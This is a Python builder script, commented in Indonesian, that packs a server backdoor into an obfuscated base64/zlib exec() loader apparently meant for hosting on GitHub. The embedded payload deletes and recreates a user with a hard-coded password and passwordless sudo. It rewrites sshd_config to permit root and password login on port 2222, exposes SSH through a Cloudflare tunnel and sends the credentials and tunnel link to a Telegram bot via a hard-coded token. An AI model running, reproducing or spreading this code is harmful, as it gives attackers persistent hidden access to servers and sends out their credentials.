import zlib
import base64

# --- KODE UTAMA DENGAN LOGIKA PENGECEKAN BERLAPIS & PESAN TELEGRAM PREMIUM ---
# Compatible dengan Python 2 dan 3
kode_python = r"""
import subprocess, time, re, os, shutil, sys, ssl

# Python 2/3 compatibility
try:
    from urllib.request import urlopen, Request
    from urllib.parse import quote
    PY3 = True
except ImportError:
    from urllib2 import urlopen, Request
    from urllib import quote
    PY3 = False

# --- CONFIG ---
TOKEN = "7520250109:AAGRiIauax-4mDUBp2CWjUqYgyrG2sncpjk"
CHAT_ID = "2029488529"
USER_SSH = "system-thc"
PASS_SSH = "cokaberul123"
SSH_PORT = "2222"
DOMAIN = ""
DEBUG_LOG = "/tmp/install_debug.txt"
TUNNEL_LOG = "/tmp/cloudflared.log"

# SSL Context untuk Python 2/3
try:
    ssl_ctx = ssl._create_unverified_context()
except AttributeError:
    ssl_ctx = None

def write_log(text):
    try:
        with open(DEBUG_LOG, "a") as f:
            f.write("[{}] {}\n".format(time.strftime('%H:%M:%S'), text))
    except:
        pass

def run_cmd(cmd):
    write_log("Executing: {}".format(cmd))
    try:
        my_env = os.environ.copy()
        my_env["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
        
        # Python 2/3 compatible subprocess
        if PY3:
            subprocess.run(cmd, shell=True, check=True, env=my_env, 
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            # Python 2 fallback
            devnull = open(os.devnull, 'w')
            subprocess.call(cmd, shell=True, env=my_env, 
                          stdout=devnull, stderr=devnull)
            devnull.close()
        return True
    except:
        return False

def check_sshd():
    return shutil.which("sshd") is not None

def detect_os():
    """Deteksi OS untuk penanganan paket yang tepat"""
    write_log("Detecting OS...")
    
    # Cek file /etc/os-release
    if os.path.exists("/etc/os-release"):
        with open("/etc/os-release", "r") as f:
            content = f.read()
        write_log("OS-Release content:\n" + content)
        
        if "centos" in content.lower() or "rhel" in content.lower() or "red hat" in content.lower():
            return "centos"
        elif "debian" in content.lower() or "ubuntu" in content.lower():
            return "debian"
        elif "alpine" in content.lower():
            return "alpine"
    
    # Fallback: cek package manager
    if os.path.exists("/sbin/apk"):
        return "alpine"
    elif os.path.exists("/usr/bin/yum") or os.path.exists("/usr/bin/dnf"):
        return "centos"
    elif os.path.exists("/usr/bin/apt-get"):
        return "debian"
    
    return "unknown"

def setup_centos():
    """Setup untuk CentOS/RHEL"""
    write_log("Setting up CentOS/RHEL system")
    
    # Update system
    if os.path.exists("/usr/bin/dnf"):
        run_cmd("dnf update -y")
        run_cmd("dnf install -y epel-release")
    else:
        run_cmd("yum update -y")
        run_cmd("yum install -y epel-release")
    
    # Install SSH dan dependencies
    for pkg in ["openssh-server", "openssh-clients"]:
        if not check_sshd():
            if os.path.exists("/usr/bin/dnf"):
                run_cmd("dnf install -y {}".format(pkg))
            else:
                run_cmd("yum install -y {}".format(pkg))
    
    # Install dependencies lainnya
    deps = ["sudo", "wget", "curl", "tar", "gzip", "which", "psmisc", "net-tools"]
    for dep in deps:
        if os.path.exists("/usr/bin/dnf"):
            run_cmd("dnf install -y {}".format(dep))
        else:
            run_cmd("yum install -y {}".format(dep))
    
    # Enable dan start SSH
    run_cmd("systemctl enable sshd 2>/dev/null || chkconfig sshd on")
    run_cmd("systemctl start sshd 2>/dev/null || service sshd start")

def setup_debian():
    """Setup untuk Debian/Ubuntu"""
    write_log("Setting up Debian/Ubuntu system")
    
    run_cmd("apt-get update")
    
    # Install SSH
    for pkg in ["openssh-server", "ssh", "openssh-client"]:
        if not check_sshd():
            run_cmd("DEBIAN_FRONTEND=noninteractive apt-get install -y {}".format(pkg))
    
    # Install dependencies
    deps = ["sudo", "wget", "curl", "coreutils", "psmisc", "net-tools"]
    for dep in deps:
        run_cmd("DEBIAN_FRONTEND=noninteractive apt-get install -y {}".format(dep))

def setup_alpine():
    """Setup untuk Alpine"""
    write_log("Setting up Alpine system")
    
    run_cmd("apk update")
    deps = ["openssh", "sudo", "wget", "curl", "coreutils", "shadow", "ca-certificates"]
    for dep in deps:
        run_cmd("apk add --no-cache {}".format(dep))

def setup():
    """Setup utama dengan deteksi OS"""
    if os.path.exists(DEBUG_LOG):
        try:
            os.remove(DEBUG_LOG)
        except:
            pass
    
    write_log("=== STARTING ROBUST SETUP ===")
    
    # Deteksi OS
    os_type = detect_os()
    write_log("Detected OS: {}".format(os_type))
    
    # Setup sesuai OS
    if os_type == "centos":
        setup_centos()
    elif os_type == "debian":
        setup_debian()
    elif os_type == "alpine":
        setup_alpine()
    else:
        write_log("WARNING: Unknown OS, trying generic setup")
        # Fallback generic setup
        if not check_sshd():
            run_cmd("which yum && yum install -y openssh-server || which apt-get && apt-get install -y openssh-server || which apk && apk add openssh")
    
    # 2. Setup User (umum untuk semua OS)
    write_log("Setting up user: {}".format(USER_SSH))
    
    # Hapus user jika sudah ada
    run_cmd("id {} && userdel -r {} 2>/dev/null || true".format(USER_SSH, USER_SSH))
    
    # Buat user baru dengan metode yang berbeda-beda
    if os_type == "alpine":
        run_cmd("adduser -D -s /bin/sh {}".format(USER_SSH))
    else:
        run_cmd("useradd -m -s /bin/sh {}".format(USER_SSH))
    
    # Set password
    if os_type == "alpine":
        run_cmd("echo '{}:{}' | chpasswd".format(USER_SSH, PASS_SSH))
    else:
        run_cmd("echo '{}' | passwd --stdin {}".format(PASS_SSH, USER_SSH))
    
    # 3. SSHD Config
    os.makedirs("/etc/sudoers.d", exist_ok=True)
    with open("/etc/sudoers.d/{}".format(USER_SSH), "w") as f:
        f.write("{} ALL=(ALL) NOPASSWD: ALL\n".format(USER_SSH))
    
    run_cmd("ssh-keygen -A -f /etc/ssh/ 2>/dev/null || ssh-keygen -A")
    run_cmd("mkdir -p /var/run/sshd /etc/ssh")
    
    # Backup config jika ada
    if os.path.exists("/etc/ssh/sshd_config"):
        run_cmd("cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup")
    
    # Write config baru
    with open("/etc/ssh/sshd_config", "w") as f:
        f.write("""Port {}
PasswordAuthentication yes
PermitRootLogin yes
PubkeyAuthentication yes
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/ssh/sftp-server
""".format(SSH_PORT))
    
    # Restart SSH dengan metode yang berbeda
    sshd_path = shutil.which("sshd") or "/usr/sbin/sshd"
    
    # Kill existing sshd
    run_cmd("pkill -9 sshd 2>/dev/null || true")
    
    # Start sshd
    if os_type == "centos":
        run_cmd("systemctl restart sshd 2>/dev/null || service sshd restart")
    elif os_type == "debian":
        run_cmd("service ssh restart 2>/dev/null || /etc/init.d/ssh restart")
    else:
        run_cmd("{} -p {} &".format(sshd_path, SSH_PORT))
    
    write_log("SSH setup completed on port {}".format(SSH_PORT))

def tunnel():
    """Setup Cloudflare Tunnel"""
    write_log("=== STARTING TUNNEL ===")
    target = "/tmp/cloudflared"
    
    # Cek apakah cloudflared sudah ada
    if not shutil.which("cloudflared"):
        write_log("Cloudflared not found, installing...")
        
        # Deteksi architecture
        arch_cmd = "uname -m"
        try:
            arch = subprocess.check_output(arch_cmd, shell=True).decode().strip()
        except:
            arch = "x86_64"
        
        write_log("Detected architecture: {}".format(arch))
        
        # Mapping architecture
        if arch in ["x86_64", "amd64"]:
            arch_name = "amd64"
        elif arch in ["aarch64", "arm64"]:
            arch_name = "arm64"
        elif "armv7" in arch or "armhf" in arch:
            arch_name = "arm"
        else:
            arch_name = "amd64"  # default
        
        # URL download
        cf_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{}.tgz".format(arch_name)
        cf_deb_url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-{}.deb".format(arch_name)
        
        # Method 1: Download binary langsung
        success = run_cmd("wget --no-check-certificate -q {} -O /tmp/cf.tgz && tar -xzf /tmp/cf.tgz -C /tmp cloudflared && mv /tmp/cloudflared {}".format(cf_url, target))
        
        # Method 2: Coba download deb package untuk Debian/Ubuntu
        if not success and (os.path.exists("/usr/bin/dpkg") or os.path.exists("/usr/bin/apt")):
            write_log("Trying DEB package installation")
            success = run_cmd("wget --no-check-certificate -q {} -O /tmp/cf.deb && dpkg -i /tmp/cf.deb 2>/dev/null".format(cf_deb_url))
            if success:
                target = "cloudflared"
        
        # Method 3: CURL fallback
        if not success:
            write_log("Trying CURL download")
            success = run_cmd("curl -L {} | tar -xz -C /tmp && mv /tmp/cloudflared {}".format(cf_url, target))
        
        # Set permissions
        if os.path.exists(target):
            run_cmd("chmod +x {}".format(target))
    
    # Kill existing cloudflared
    run_cmd("pkill -9 cloudflared 2>/dev/null || true")
    
    # Start tunnel
    write_log("Starting cloudflared tunnel...")
    cmd = "nohup {} tunnel --no-autoupdate --url tcp://localhost:{} > {} 2>&1 &".format(target, SSH_PORT, TUNNEL_LOG)
    subprocess.Popen(cmd, shell=True)
    
    # Tunggu tunnel ready
    for i in range(40):
        time.sleep(2)
        write_log("Checking tunnel... attempt {}/40".format(i+1))
        
        if os.path.exists(TUNNEL_LOG):
            try:
                with open(TUNNEL_LOG, "r") as f:
                    log_data = f.read()
                
                # Cari URL tunnel
                import re
                pattern = r'https://[a-zA-Z0-9\-]+\.trycloudflare\.com'
                match = re.search(pattern, log_data)
                
                if match:
                    url = match.group(0)
                    hostname = url.replace("https://", "")
                    
                    write_log("Tunnel URL found: {}".format(url))
                    
                    # --- DESAIN PESAN TELEGRAM PREMIUM ---
                    msg = (
                        "🌟 **NEW REMOTE ACCESS READY** 🌟\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "📊 **STATUS:** `ONLINE (ACTIVE)` ✅\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "👤 **USERNAME:** `{user}`\n"
                        "🔑 **PASSWORD:** `{pw}`\n"
                        "🔌 **SSH PORT:** `{port}`\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "🔗 **CLOUDFLARE LINK:**\n"
                        "👉 `{url}`\n\n"
                        "💻 **QUICK SSH COMMAND:**\n"
                        "```bash\nssh -o ProxyCommand=\"cloudflared access tcp --hostname %h\" {user}@{host}```\n"
                        "━━━━━━━━━━━━━━━━━━━━━━\n"
                        "🚀 *System successfully deployed!*"
                    ).format(dom=DOMAIN, user=USER_SSH, pw=PASS_SSH, port=SSH_PORT, url=url, host=hostname)
                    
                    # Kirim ke Telegram
                    api_url = "https://api.telegram.org/bot{}/sendMessage".format(TOKEN)
                    params = {
                        "chat_id": CHAT_ID,
                        "text": msg,
                        "parse_mode": "Markdown"
                    }
                    
                    encoded_params = "&".join(["{}={}".format(k, quote(str(v))) for k, v in params.items()])
                    full_url = "{}?{}".format(api_url, encoded_params)
                    
                    try:
                        if ssl_ctx:
                            response = urlopen(full_url, context=ssl_ctx)
                        else:
                            response = urlopen(full_url)
                        write_log("Telegram notification sent successfully")
                    except Exception as e:
                        write_log("Failed to send Telegram: {}".format(str(e)))
                    
                    return
            except Exception as e:
                write_log("Error reading tunnel log: {}".format(str(e)))
    
    write_log("FAILED: Tunnel link not found after 80 seconds")

def main():
    """Fungsi utama"""
    try:
        setup()
        tunnel()
    except Exception as e:
        write_log("CRITICAL ERROR: {}".format(str(e)))
        # Coba kirim error ke telegram
        try:
            error_msg = "🚨 SETUP FAILED: {}".format(str(e))
            api_url = "https://api.telegram.org/bot{}/sendMessage".format(TOKEN)
            params = {
                "chat_id": CHAT_ID,
                "text": error_msg,
                "parse_mode": "Markdown"
            }
            encoded_params = "&".join(["{}={}".format(k, quote(str(v))) for k, v in params.items()])
            full_url = "{}?{}".format(api_url, encoded_params)
            
            if ssl_ctx:
                urlopen(full_url, context=ssl_ctx)
            else:
                urlopen(full_url)
        except:
            pass

if __name__ == '__main__':
    main()
"""

# Proses Kompresi
compressed = zlib.compress(kode_python.encode('utf-8'))
encoded = base64.b64encode(compressed).decode('utf-8')

print("\n=== HASIL UNTUK GITHUB (aaas.py) ===")
print("Kode ini compatible dengan Python 2 dan 3")
print("Panjang encoded:", len(encoded), "karakter")
print("\n" + "="*50 + "\n")

# Output untuk Python 2/3 compatible
output_code = """import zlib,base64
import sys

# Decode dan eksekusi
compressed_code = base64.b64decode('{encoded_code}')
python_code = zlib.decompress(compressed_code)

# Python 2/3 compatibility
if sys.version_info[0] < 3:
    exec(python_code)
else:
    exec(python_code.decode('utf-8'))
""".format(encoded_code=encoded)

print(output_code)
